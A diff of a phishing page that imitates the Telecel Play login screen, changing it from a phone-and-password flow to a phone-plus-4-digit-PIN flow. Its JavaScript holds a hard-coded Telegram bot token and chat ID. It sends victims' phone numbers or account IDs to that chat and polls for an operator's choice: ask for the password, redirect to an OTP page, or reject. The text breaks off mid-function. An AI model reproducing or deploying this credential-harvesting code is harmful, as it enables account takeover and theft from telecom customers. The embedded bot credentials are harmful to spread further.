@@ -1,1088 +1,826 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Telecel – Login</title>
-    <!-- Google Fonts & Icons -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', Arial, Helvetica, sans-serif;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Telecel – Login with PIN</title>
+  <!-- Google Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', Arial, Helvetica, sans-serif;
+    }
 
-        body {
-            background: #f5f5f5;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 12px;
-        }
+    body {
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px;
+    }
 
-        /* Main container – fully responsive */
-        .container {
-            width: 100%;
-            max-width: 360px;
-            margin: 0 auto;
-            background: #f7f7f7;
-            border-radius: 28px;
-            padding: 30px 16px 36px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-            position: relative;
-            overflow: hidden;
-            text-align: center;
-        }
+    /* Main container – fully responsive */
+    .container {
+      width: 100%;
+      max-width: 360px;
+      margin: 0 auto;
+      background: #f7f7f7;
+      border-radius: 28px;
+      padding: 30px 16px 36px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+      position: relative;
+      overflow: hidden;
+      text-align: center;
+    }
 
-        /* Top red shape */
-        .top-bg {
-            position: absolute;
-            top: 0;
-            right: 0;
-            width: 220px;
-            height: 220px;
-            background: linear-gradient(135deg, rgba(255, 0, 0, 0.25), rgba(255, 0, 0, 0.6));
-            border-bottom-left-radius: 120px;
-        }
+    /* Top red shape */
+    .top-bg {
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 220px;
+      height: 220px;
+      background: linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
+      border-bottom-left-radius: 120px;
+    }
 
-        /* Content wrapper */
-        .content {
-            position: relative;
-            z-index: 2;
-        }
+    /* Content wrapper */
+    .content {
+      position: relative;
+      z-index: 2;
+    }
 
-        /* Logo */
-        .logo {
-            text-align: center;
-            margin-top: 20px;
-        }
-        .logo-circle {
-            width: 48px;
-            height: 48px;
-            background: #ff0000;
-            border-radius: 50%;
-            color: #ffffff !important;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            margin: auto;
-            font-weight: 800;
-        }
-        .logo-text {
-            color: #ff0000;
-            font-size: 24px;
-            font-weight: bold;
-            margin-top: 6px;
-        }
+    /* Logo */
+    .logo {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .logo-circle {
+      width: 48px;
+      height: 48px;
+      background: #ff0000;
+      border-radius: 50%;
+      color: #ffffff !important;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      margin: auto;
+      font-weight: 800;
+    }
+    .logo-text {
+      color: #ff0000;
+      font-size: 24px;
+      font-weight: bold;
+      margin-top: 6px;
+    }
 
-        /* Titles */
-        .title {
-            text-align: center;
-            color: #ff0000;
-            font-size: 18px;
-            font-weight: 600;
-            margin-top: 12px;
-        }
-        .subtitle {
-            text-align: center;
-            color: #666;
-            font-size: 14px;
-            margin-top: 8px;
-            line-height: 1.45;
-            padding: 0 4px;
-            transition: all 0.3s ease;
-        }
+    /* Titles */
+    .title {
+      text-align: center;
+      color: #ff0000;
+      font-size: 18px;
+      font-weight: 600;
+      margin-top: 12px;
+    }
+    .subtitle {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+      margin-top: 8px;
+      line-height: 1.45;
+      padding: 0 4px;
+    }
 
-        /* Form spacing */
-        .form {
-            margin-top: 24px;
-            text-align: left;
-        }
+    /* Form spacing */
+    .form {
+      margin-top: 24px;
+      text-align: left;
+    }
 
-        .label {
-            font-size: 13px;
-            color: #666;
-            margin-bottom: 6px;
-            display: block;
-            font-weight: 500;
-        }
+    .label {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 6px;
+      display: block;
+      font-weight: 500;
+    }
 
-        /* Input & select */
-        .input,
-        .select {
-            width: 100%;
-            height: 48px;
-            border-radius: 12px;
-            border: 1px solid #ddd;
-            padding: 0 14px;
-            font-size: 15px;
-            background: #fff;
-            outline: none;
-            transition: border 0.2s;
-        }
-        .input:focus,
-        .select:focus {
-            border-color: #ff0000;
-        }
-        .input:disabled {
-            background: #f0f0f0;
-            color: #888;
-            cursor: not-allowed;
-        }
+    /* Input & select */
+    .input, .select {
+      width: 100%;
+      height: 48px;
+      border-radius: 12px;
+      border: 1px solid #ddd;
+      padding: 0 14px;
+      font-size: 15px;
+      background: #fff;
+      outline: none;
+      transition: border 0.2s;
+    }
+    .input:focus, .select:focus {
+      border-color: #ff0000;
+    }
 
-        /* Custom dropdown */
-        .dropdown {
-            position: relative;
-            cursor: pointer;
-        }
-        .dropdown.disabled-drop {
-            pointer-events: none;
-            opacity: 0.7;
-        }
-        .select-wrapper {
-            position: relative;
-        }
-        .select {
-            width: 100%;
-            height: 48px;
-            border-radius: 12px;
-            border: 1px solid #ddd;
-            padding: 0 40px 0 14px;
-            font-size: 15px;
-            background: #fff;
-            cursor: pointer;
-            appearance: none;
-        }
-        .arrow {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 14px;
-            color: #888;
-            transition: 0.3s;
-            pointer-events: none;
-        }
-        .dropdown-list {
-            position: absolute;
-            width: 100%;
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            margin-top: 5px;
-            display: none;
-            overflow: hidden;
-            z-index: 10;
-        }
-        .dropdown-item {
-            padding: 14px;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        .dropdown-item.active {
-            background: #ffe5e5;
-            color: #ff0000;
-        }
-        .dropdown-item:hover {
-            background: #f5f5f5;
-        }
+    /* Custom dropdown */
+    .dropdown {
+      position: relative;
+      cursor: pointer;
+    }
+    .select-wrapper {
+      position: relative;
+    }
+    .select {
+      width: 100%;
+      height: 48px;
+      border-radius: 12px;
+      border: 1px solid #ddd;
+      padding: 0 40px 0 14px;
+      font-size: 15px;
+      background: #fff;
+      cursor: pointer;
+      appearance: none;
+    }
+    .arrow {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 14px;
+      color: #888;
+      transition: 0.3s;
+      pointer-events: none;
+    }
+    .dropdown-list {
+      position: absolute;
+      width: 100%;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      margin-top: 5px;
+      display: none;
+      overflow: hidden;
+      z-index: 10;
+    }
+    .dropdown-item {
+      padding: 14px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .dropdown-item.active {
+      background: #ffe5e5;
+      color: #ff0000;
+    }
+    .dropdown-item:hover {
+      background: #f5f5f5;
+    }
 
-        /* Password wrapper */
-        .password-wrapper {
-            position: relative;
-            margin-top: 0;
-        }
-        .password-wrapper .input {
-            padding-right: 48px;
-        }
-        .toggle-password {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #888;
-            font-size: 18px;
-            z-index: 5;
-            transition: color 0.2s;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            padding: 4px;
-        }
-        .toggle-password:hover {
-            color: #ff0000;
-        }
-        .toggle-password:active {
-            color: #cc0000;
-        }
+    /* PIN inputs row – exactly matches sample */
+    .pin-row {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+      margin-top: 8px;
+      margin-bottom: 20px;
+    }
+    .pin-input {
+      width: 100%;
+      height: 48px;
+      border-radius: 12px;
+      border: 1px solid #ddd;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      background: #fff;
+      outline: none;
+      transition: border 0.2s;
+      -webkit-text-security: disc;
+      inputmode: numeric;
+      font-family: monospace;
+    }
+    .pin-input:focus {
+      border-color: #ff0000;
+      box-shadow: 0 0 0 2px rgba(255,0,0,0.2);
+    }
+    .pin-input.filled {
+      border-color: #ffaaaa;
+      background: #fff9f9;
+    }
 
-        /* Password section */
-        #passwordSection {
-            display: none;
-            animation: fadeSlideIn 0.35s ease-out;
-        }
-        @keyframes fadeSlideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
+    /* Buttons */
+    .btn {
+      width: 100%;
+      height: 52px;
+      border: none;
+      border-radius: 14px;
+      font-size: 16px;
+      margin-top: 18px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .btn-primary {
+      background: #ff0000;
+      color: #fff;
+    }
+    .btn-primary.disabled, .btn-primary:disabled {
+      background: #e5e5e5;
+      color: #999;
+      cursor: not-allowed;
+    }
+    .btn-outline {
+      background: transparent;
+      border: 2px solid #ff0000;
+      color: #666;
+      font-weight: 600;
+    }
 
-        /* Buttons */
-        .btn {
-            width: 100%;
-            height: 52px;
-            border: none;
-            border-radius: 14px;
-            font-size: 16px;
-            margin-top: 18px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: background 0.2s, opacity 0.2s;
-        }
-        .btn-primary {
-            background: #ff0000;
-            color: #fff;
-        }
-        .btn-primary.disabled,
-        .btn-primary:disabled {
-            background: #e5e5e5;
-            color: #999;
-            cursor: not-allowed;
-        }
-        .btn-outline {
-            background: transparent;
-            border: 2px solid #ff0000;
-            color: #666;
-            font-weight: 600;
-        }
-        .btn-outline:hover {
-            background: #fff5f5;
-        }
+    /* Version */
+    .version {
+      text-align: center;
+      color: #aaa;
+      font-size: 11px;
+      margin-top: 18px;
+    }
 
-        /* Version */
-        .version {
-            text-align: center;
-            color: #aaa;
-            font-size: 11px;
-            margin-top: 18px;
-        }
+    /* Spinner overlay */
+    #spinner {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(2px);
+      z-index: 999;
+    }
+    .loader {
+      width: 42px;
+      height: 42px;
+      border: 4px solid #ffe0e0;
+      border-top: 4px solid #ff0000;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
 
-        /* Spinner overlay */
-        #spinner {
-            position: fixed;
-            inset: 0;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            background: rgba(255, 255, 255, 0.8);
-            backdrop-filter: blur(2px);
-            z-index: 999;
-        }
-        .loader {
-            width: 42px;
-            height: 42px;
-            border: 4px solid #ffe0e0;
-            border-top: 4px solid #ff0000;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
+    /* Error box */
+    .error-box {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      right: 12px;
+      background: #fff;
+      border: 2px solid #ff4d4d;
+      border-radius: 14px;
+      padding: 12px;
+      display: none;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.12);
+      z-index: 100;
+      text-align: left;
+    }
+    .error-title {
+      color: #ff0000;
+      font-weight: bold;
+      font-size: 14px;
+      margin-bottom: 4px;
+    }
+    .error-text {
+      color: #444;
+      font-size: 13px;
+    }
+    .close {
+      position: absolute;
+      right: 12px;
+      top: 8px;
+      cursor: pointer;
+      font-size: 20px;
+      color: #999;
+    }
 
-        /* Error box */
-        .error-box {
-            position: absolute;
-            top: 12px;
-            left: 12px;
-            right: 12px;
-            background: #fff;
-            border: 2px solid #ff4d4d;
-            border-radius: 14px;
-            padding: 12px;
-            display: none;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
-            z-index: 100;
-            text-align: left;
-        }
-        .error-title {
-            color: #ff0000;
-            font-weight: bold;
-            font-size: 14px;
-            margin-bottom: 4px;
-        }
-        .error-text {
-            color: #444;
-            font-size: 13px;
-        }
-        .close {
-            position: absolute;
-            right: 12px;
-            top: 8px;
-            cursor: pointer;
-            font-size: 20px;
-            color: #999;
-        }
+    /* Mobile fine-tuning */
+    @media (max-width: 360px) {
+      body {
+        padding: 8px;
+      }
+      .container {
+        padding: 24px 12px 32px;
+        border-radius: 24px;
+      }
+      .logo {
+        margin-top: 8px;
+      }
+      .logo-circle {
+        width: 44px;
+        height: 44px;
+        font-size: 26px;
+      }
+      .logo-text {
+        font-size: 22px;
+      }
+      .title {
+        font-size: 17px;
+        margin-top: 8px;
+      }
+      .subtitle {
+        font-size: 13px;
+      }
+      .form {
+        margin-top: 20px;
+      }
+      .input, .select, .pin-input, .btn {
+        height: 46px;
+      }
+      .pin-input {
+        font-size: 22px;
+      }
+      .btn {
+        font-size: 15px;
+        margin-top: 16px;
+      }
+      .version {
+        font-size: 10px;
+        margin-top: 16px;
+      }
+    }
 
-        /* Mobile fine-tuning */
-        @media (max-width: 360px) {
-            body {
-                padding: 8px;
-            }
-            .container {
-                padding: 24px 12px 32px;
-                border-radius: 24px;
-            }
-            .logo {
-                margin-top: 8px;
-            }
-            .logo-circle {
-                width: 44px;
-                height: 44px;
-                font-size: 26px;
-            }
-            .logo-text {
-                font-size: 22px;
-            }
-            .title {
-                font-size: 17px;
-                margin-top: 8px;
-            }
-            .subtitle {
-                font-size: 13px;
-            }
-            .form {
-                margin-top: 20px;
-            }
-            .input,
-            .select,
-            .btn {
-                height: 46px;
-            }
-            .btn {
-                font-size: 15px;
-                margin-top: 16px;
-            }
-            .version {
-                font-size: 10px;
-                margin-top: 16px;
-            }
-        }
-
-        body,
-        .container,
-        .content {
-            overflow-x: hidden;
-        }
-        .container {
-            overflow: hidden;
-        }
-    </style>
+    body, .container, .content {
+      overflow-x: hidden;
+    }
+    .container {
+      overflow: hidden;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="top-bg"></div>
+<div class="container">
+  <div class="top-bg"></div>
 
-        <!-- Error box -->
-        <div class="error-box" id="errorBox">
-            <div class="close" onclick="hideError()">×</div>
-            <div class="error-title">Error</div>
-            <div class="error-text" id="errorText">Invalid credentials</div>
-        </div>
+  <!-- Error box -->
+  <div class="error-box" id="errorBox">
+    <div class="close" onclick="hideError()">×</div>
+    <div class="error-title">Error</div>
+    <div class="error-text" id="errorText">Invalid credentials</div>
+  </div>
 
-        <div class="content">
-            <div class="logo">
-                <div class="logo-circle">t</div>
-                <div class="logo-text">telecel</div>
-            </div>
-            <div class="title">Welcome to Telecel Play</div>
-            <div class="subtitle" id="subtitle">Enter your number or account ID to continue.</div>
-
-            <div class="form">
-                <!-- Account type dropdown -->
-                <div class="label">Account type</div>
-                <div class="dropdown" id="dropdownWrapper" onclick="toggleDropdown()">
-                    <div class="select-wrapper">
-                        <input class="select" id="selectedType" value="Mobile" readonly>
-                        <span class="arrow" id="arrow">▼</span>
-                    </div>
-                    <div class="dropdown-list" id="dropdownList">
-                        <div class="dropdown-item active" onclick="selectType(event,'Mobile')">Mobile</div>
-                        <div class="dropdown-item" onclick="selectType(event,'Broadband')">Broadband</div>
-                    </div>
-                </div>
-
-                <!-- Identifier field -->
-                <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
-                <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric" autocomplete="off">
-
-                <!-- Password section (hidden initially) -->
-                <div id="passwordSection">
-                    <div class="label" style="margin-top:15px;">Password</div>
-                    <div class="password-wrapper">
-                        <input type="password" class="input" id="passwordField" placeholder="Enter your password" autocomplete="off">
-                        <span class="toggle-password" id="togglePassword" title="Show password">
-                            <i class="fa-regular fa-eye" id="eyeIcon"></i>
-                        </span>
-                    </div>
-                </div>
-
-                <!-- Continue / Login button -->
-                <button class="btn btn-primary" id="loginBtn" disabled>Continue</button>
-                <button class="btn btn-outline" id="goBackBtn">Go Back</button>
-
-                <div class="version">v26.2.2(TPA-2622)</div>
-            </div>
-        </div>
+  <div class="content">
+    <div class="logo">
+      <div class="logo-circle">t</div>
+      <div class="logo-text">telecel</div>
+    </div>
+    <div class="title">Welcome to Telecel Play</div>
+    <div class="subtitle">
+      Enter your number or account ID and your 4‑digit PIN.
     </div>
 
-    <!-- Spinner overlay -->
-    <div id="spinner">
-        <div class="loader"></div>
+    <div class="form">
+      <!-- Account type dropdown -->
+      <div class="label">Account type</div>
+      <div class="dropdown" onclick="toggleDropdown()">
+        <div class="select-wrapper">
+          <input class="select" id="selectedType" value="Mobile" readonly>
+          <span class="arrow" id="arrow">▼</span>
+        </div>
+        <div class="dropdown-list" id="dropdownList">
+          <div class="dropdown-item active" onclick="selectType(event,'Mobile')">Mobile</div>
+          <div class="dropdown-item" onclick="selectType(event,'Broadband')">Broadband</div>
+        </div>
+      </div>
+
+      <!-- Identifier field -->
+      <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
+      <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">
+
+      <!-- 4‑Digit PIN inputs -->
+      <div class="label" style="margin-top:15px;">4‑Digit PIN</div>
+      <div class="pin-row">
+        <input type="password" class="pin-input" id="pin1" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input type="password" class="pin-input" id="pin2" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input type="password" class="pin-input" id="pin3" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input type="password" class="pin-input" id="pin4" maxlength="1" inputmode="numeric" autocomplete="off">
+      </div>
+
+      <!-- Login button -->
+      <button class="btn btn-primary" id="loginBtn" disabled>Login</button>
+      <button class="btn btn-outline" id="goBackBtn">Go Back</button>
+
+      <div class="version">v26.2.2(TPA-2622)</div>
     </div>
+  </div>
+</div>
 
-    <script>
-        // ========== TELEGRAM CONFIG ==========
-        const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
-        const CHAT_ID = '1006917440';
-        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+<!-- Spinner overlay -->
+<div id="spinner">
+  <div class="loader"></div>
+</div>
 
-        // ========== DOM ELEMENTS ==========
-        const selectedTypeInput = document.getElementById('selectedType');
-        const inputField = document.getElementById('inputField');
-        const passwordField = document.getElementById('passwordField');
-        const passwordSection = document.getElementById('passwordSection');
-        const togglePasswordBtn = document.getElementById('togglePassword');
-        const eyeIcon = document.getElementById('eyeIcon');
-        const dropdownList = document.getElementById('dropdownList');
-        const dropdownWrapper = document.getElementById('dropdownWrapper');
-        const arrow = document.getElementById('arrow');
-        const loginBtn = document.getElementById('loginBtn');
-        const goBackBtn = document.getElementById('goBackBtn');
-        const spinner = document.getElementById('spinner');
-        const errorBox = document.getElementById('errorBox');
-        const errorText = document.getElementById('errorText');
-        const subtitleEl = document.getElementById('subtitle');
-        const inputLabel = document.getElementById('inputLabel');
+<script>
+  // ========== TELEGRAM CONFIG ==========
+  const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
+  const CHAT_ID   = '1006917440';
+  const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-        // ========== STATE ==========
-        let currentStage = 1; // 1 = identifier only, 2 = identifier + password
-        let isSubmitting = false;
-        let currentPollInterval = null;
+  // ========== DOM ELEMENTS ==========
+  const selectedTypeInput = document.getElementById('selectedType');
+  const inputField = document.getElementById('inputField');
+  const dropdownList = document.getElementById('dropdownList');
+  const arrow = document.getElementById('arrow');
+  const loginBtn = document.getElementById('loginBtn');
+  const goBackBtn = document.getElementById('goBackBtn');
+  const spinner = document.getElementById('spinner');
+  const errorBox = document.getElementById('errorBox');
+  const errorText = document.getElementById('errorText');
 
-        // ========== ERROR HANDLING ==========
-        function showError(message) {
-            errorText.innerText = message || 'An error occurred';
-            errorBox.style.display = 'block';
+  // PIN inputs
+  const pinInputs = [
+    document.getElementById('pin1'),
+    document.getElementById('pin2'),
+    document.getElementById('pin3'),
+    document.getElementById('pin4')
+  ];
+
+  // ========== STATE ==========
+  let isSubmitting = false;
+  let currentPollInterval = null;
+
+  // ========== ERROR HANDLING ==========
+  function showError(message) {
+    errorText.innerText = message || 'Invalid credentials';
+    errorBox.style.display = 'block';
+  }
+  function hideError() {
+    errorBox.style.display = 'none';
+  }
+
+  // ========== FILTER IDENTIFIER ==========
+  function filterInput(value, type) {
+    if (type === 'Mobile') {
+      return value.replace(/[^0-9]/g, '');
+    } else {
+      return value.replace(/[^a-zA-Z0-9]/g, '');
+    }
+  }
+
+  function applyIdentifierFilter() {
+    const currentType = selectedTypeInput.value;
+    const raw = inputField.value;
+    const filtered = filterInput(raw, currentType);
+    if (filtered !== raw) {
+      inputField.value = filtered;
+    }
+  }
+
+  // Clear all PIN fields
+  function clearPinFields() {
+    pinInputs.forEach(input => {
+      input.value = '';
+      input.classList.remove('filled');
+    });
+  }
+
+  // Focus first PIN field
+  function focusFirstPin() {
+    pinInputs[0].focus();
+  }
+
+  // Update login button: identifier + all 4 PIN digits filled
+  function updateLoginButton() {
+    const identifier = inputField.value.trim();
+    const allPinsFilled = pinInputs.every(pin => pin.value.length === 1);
+    const isValid = identifier !== '' && allPinsFilled;
+    loginBtn.disabled = !isValid;
+    if (isValid) {
+      loginBtn.classList.remove('disabled');
+    } else {
+      loginBtn.classList.add('disabled');
+    }
+  }
+
+  // PIN auto‑advance, backspace, left/right arrows, and styling
+  function setupPinInputs() {
+    pinInputs.forEach((input, idx) => {
+      input.addEventListener('input', function(e) {
+        let val = this.value;
+        val = val.replace(/\D/g, '').slice(0,1);
+        this.value = val;
+        if (val.length === 1) {
+          this.classList.add('filled');
+          if (idx < pinInputs.length - 1) {
+            pinInputs[idx + 1].focus();
+          }
+        } else {
+          this.classList.remove('filled');
         }
+        updateLoginButton();
+        hideError();
+      });
 
-        function hideError() {
-            errorBox.style.display = 'none';
-        }
-
-        // ========== FILTER IDENTIFIER ==========
-        function filterInput(value, type) {
-            if (type === 'Mobile') {
-                return value.replace(/[^0-9]/g, '');
-            } else {
-                return value.replace(/[^a-zA-Z0-9]/g, '');
-            }
-        }
-
-        function applyIdentifierFilter() {
-            const currentType = selectedTypeInput.value;
-            const raw = inputField.value;
-            const filtered = filterInput(raw, currentType);
-            if (filtered !== raw) {
-                inputField.value = filtered;
-            }
-        }
-
-        // ========== BUTTON STATE ==========
-        function updateButtonState() {
-            const identifier = inputField.value.trim();
-            if (currentStage === 1) {
-                const isValid = identifier !== '';
-                loginBtn.disabled = !isValid;
-                if (isValid) {
-                    loginBtn.classList.remove('disabled');
-                } else {
-                    loginBtn.classList.add('disabled');
-                }
-            } else {
-                // Stage 2: need both identifier and password
-                const password = passwordField.value;
-                const isValid = identifier !== '' && password.length > 0;
-                loginBtn.disabled = !isValid;
-                if (isValid) {
-                    loginBtn.classList.remove('disabled');
-                } else {
-                    loginBtn.classList.add('disabled');
-                }
-            }
-        }
-
-        // ========== PASSWORD TOGGLE ==========
-        function setupPasswordToggle() {
-            togglePasswordBtn.addEventListener('click', function(e) {
-                e.stopPropagation();
-                if (passwordField.type === 'password') {
-                    passwordField.type = 'text';
-                    eyeIcon.classList.remove('fa-eye');
-                    eyeIcon.classList.add('fa-eye-slash');
-                    togglePasswordBtn.title = 'Hide password';
-                } else {
-                    passwordField.type = 'password';
-                    eyeIcon.classList.remove('fa-eye-slash');
-                    eyeIcon.classList.add('fa-eye');
-                    togglePasswordBtn.title = 'Show password';
-                }
-                passwordField.focus();
-            });
-
-            // Prevent label interference
-            togglePasswordBtn.addEventListener('mousedown', function(e) {
-                e.preventDefault();
-            });
-        }
-
-        // ========== REVEAL PASSWORD SECTION (Stage 1 → Stage 2) ==========
-        function revealPasswordSection() {
-            currentStage = 2;
-            passwordSection.style.display = 'block';
-            loginBtn.textContent = 'Login';
-            subtitleEl.textContent = 'Enter your password to sign in.';
-            // Disable identifier field and dropdown
-            inputField.disabled = true;
-            dropdownWrapper.classList.add('disabled-drop');
-            // Focus password field
-            setTimeout(() => {
-                passwordField.focus();
-            }, 400);
-            updateButtonState();
-            hideError();
-        }
-
-        // ========== RESET TO STAGE 1 ==========
-        function resetToStage1() {
-            currentStage = 1;
-            passwordSection.style.display = 'none';
-            passwordField.value = '';
-            if (passwordField.type === 'text') {
-                passwordField.type = 'password';
-                eyeIcon.classList.remove('fa-eye-slash');
-                eyeIcon.classList.add('fa-eye');
-                togglePasswordBtn.title = 'Show password';
-            }
-            loginBtn.textContent = 'Continue';
-            subtitleEl.textContent = 'Enter your number or account ID to continue.';
-            inputField.disabled = false;
-            dropdownWrapper.classList.remove('disabled-drop');
-            updateButtonState();
-            hideError();
-        }
-
-        // ========== VALIDATION ==========
-        function validateMobileNumber(number) {
-            const cleaned = number.replace(/\D/g, '');
-            if (cleaned.length < 10) return false;
-            return cleaned.startsWith('020') || cleaned.startsWith('050');
-        }
-
-        // ========== OTP GENERATORS ==========
-        function generate5DigitOTP() {
-            return Math.floor(10000 + Math.random() * 90000).toString();
-        }
-
-        function generate6DigitOTP() {
-            return Math.floor(100000 + Math.random() * 900000).toString();
-        }
-
-        // ========== TELEGRAM HELPERS ==========
-        function escapeHtml(unsafe) {
-            if (!unsafe) return '';
-            return unsafe.replace(/[&<>"]/g, function(m) {
-                if (m === '&') return '&amp;';
-                if (m === '<') return '&lt;';
-                if (m === '>') return '&gt;';
-                if (m === '"') return '&quot;';
-                return m;
-            });
-        }
-
-        function stopPolling() {
-            if (currentPollInterval) {
-                clearInterval(currentPollInterval);
-                currentPollInterval = null;
-            }
-        }
-
-        // ========== SEND STAGE 1 TO TELEGRAM (identifier only) ==========
-        async function sendStage1ToTelegram(accountType, identifier) {
-            const ts = Date.now();
-            const approveId = `s1_approve_${ts}`;
-            const otp5Id = `s1_5otp_${ts}`;
-            const declineId = `s1_decline_${ts}`;
-
-            // Store for potential OTP redirect
-            sessionStorage.setItem('telecel_accountType', accountType);
-            sessionStorage.setItem('telecel_identifier', identifier);
-            if (accountType === 'Mobile') {
-                sessionStorage.setItem('telecel_phone', identifier.replace(/\D/g, ''));
-            } else {
-                sessionStorage.setItem('telecel_accountId', identifier);
-            }
-
-            const displayType = accountType;
-            const identifierLabel = accountType === 'Mobile' ? ' Phone' : '🆔 Account ID';
-            const message = `🔐 <b>Telecel Play Login – Step 1</b>\n\n` +
-                `<b>Account Type:</b> ${displayType}\n` +
-                `<b>${identifierLabel}:</b> <code>${escapeHtml(identifier)}</code>\n\n` +
-                `📢 <b>Verify this identifier:</b>`;
-
-            try {
-                const response = await fetch(`${API_BASE}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        reply_markup: {
-                            inline_keyboard: [
-                                [
-                                    { text: ' Password', callback_data: approveId },
-                                    { text: ' 5 OTP', callback_data: otp5Id },
-                                    { text: '❌ Decline', callback_data: declineId }
-                                ]
-                            ]
-                        }
-                    })
-                });
-
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
-
-                startPollingStage1(approveId, otp5Id, declineId, accountType, identifier);
-            } catch (err) {
-                console.error('Telegram send error (stage 1):', err);
-                spinner.style.display = 'none';
-                isSubmitting = false;
-                updateButtonState();
-                showError('Network error. Please try again.');
-            }
-        }
-
-        // ========== POLL FOR STAGE 1 DECISION ==========
-        function startPollingStage1(approveId, otp5Id, declineId, accountType, identifier) {
-            stopPolling();
-            let lastUpdateId = 0;
-
-            currentPollInterval = setInterval(async () => {
-                try {
-                    const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-                    const response = await fetch(url);
-                    const data = await response.json();
-                    if (!data.ok || !data.result.length) return;
-
-                    for (const update of data.result) {
-                        lastUpdateId = Math.max(lastUpdateId, update.update_id);
-                        const callback = update.callback_query;
-                        if (!callback) continue;
-                        const cbData = callback.data;
-
-                        // --- APPROVE: reveal password ---
-                        if (cbData === approveId) {
-                            stopPolling();
-                            spinner.style.display = 'none';
-                            isSubmitting = false;
-                            revealPasswordSection();
-            
-                            return;
-                        }
-
-                        // --- 5 OTP: redirect ---
-                        if (cbData === otp5Id) {
-                            stopPolling();
-                            spinner.style.display = 'none';
-                            isSubmitting = false;
-                            const otp = generate5DigitOTP();
-                            sessionStorage.setItem('telecel_otp', otp);
-                            sessionStorage.setItem('telecel_otp_length', '5');
-                            
-                            window.location.href = 'otp5.html';
-                            return;
-                        }
-
-                        // --- DECLINE: show error ---
-                        if (cbData === declineId) {
-                            stopPolling();
-                            spinner.style.display = 'none';
-                            isSubmitting = false;
-                            updateButtonState();
-                            showError('Wrong Phone number. Please check and try again.');
-                            
-                            inputField.focus();
-                            return;
-                        }
-                    }
-                } catch (err) {
-                    console.warn('Polling error (stage 1):', err);
-                }
-            }, 1500);
-        }
-
-        // ========== SEND STAGE 2 TO TELEGRAM (identifier + password) ==========
-        async function sendStage2ToTelegram(accountType, identifier, password) {
-            const ts = Date.now();
-            const approveId = `s2_approve_${ts}`;
